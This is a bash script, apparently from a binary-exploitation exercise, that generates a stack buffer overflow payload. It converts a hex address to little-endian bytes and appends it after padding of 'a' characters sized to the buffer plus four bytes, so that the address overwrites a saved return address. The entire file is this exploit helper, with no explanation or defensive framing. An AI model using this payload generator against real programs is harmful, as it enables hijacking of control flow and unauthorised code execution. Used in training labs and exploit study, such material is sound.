#!/bin/bash

getRawAddress() {

    local hexAddress="${1}"
    local hexAddressLength=${#hexAddress}
    local byte=""
    local bytes=()
    local bytesSize=""
    local bytesIndex=""
    local assembledBytes=""

    if [ $(( ${hexAddressLength} % 2 )) -eq 0 ]
    then
        bytesSize=$(( ${hexAddressLength} / 2 - 1))
        bytesIndex=${bytesSize}
    else
        echo "ERROR: Invalid hexadecimal address."
        exit 1
    fi

    for i in $(seq 1 ${hexAddressLength}); do

        byte="${byte}${hexAddress:i-1:1}"

        if [ $(( ${i} % 2 )) -eq 0 2> /dev/null ]
        then
            byte="\x${byte}"
            bytes[${bytesIndex}]="${byte}"
            byte=""
            ((bytesIndex--))
        fi
    
    done

    for byte in "${bytes[@]}"; do

        assembledBytes="${assembledBytes}${byte}"

    done

    echo -e "${assembledBytes}"

}

getRepeatedString() {

    local repeatCount=${1}
    local charToRepeat="a"
    local finalString=""

    if [ "${repeatCount}" -eq "${repeatCount}" 2> /dev/null ]
    then
        for i in $(seq 1 ${repeatCount}); do

            finalString="${finalString}${charToRepeat}"

        done
    else
        finalString="${charToRepeat}"
    fi

    echo "${finalString}"

}


getPayload() {

    local hexAddress="${1}"
    local bufferSizeInBytes=${2}
    local extraSizeInBytes=4
    local totalOverwriteSize=$(( ${bufferSizeInBytes} + ${extraSizeInBytes} ))
    local rawAddress="$(getRawAddress ${hexAddress})"
    local payload="$(getRepeatedString ${totalOverwriteSize})${rawAddress}"

    echo "${payload}"

}

targetHexAddress="${1}"
bufferSizeInBytes="${2}"

getPayload "${targetHexAddress}" "${bufferSizeInBytes}"

exit
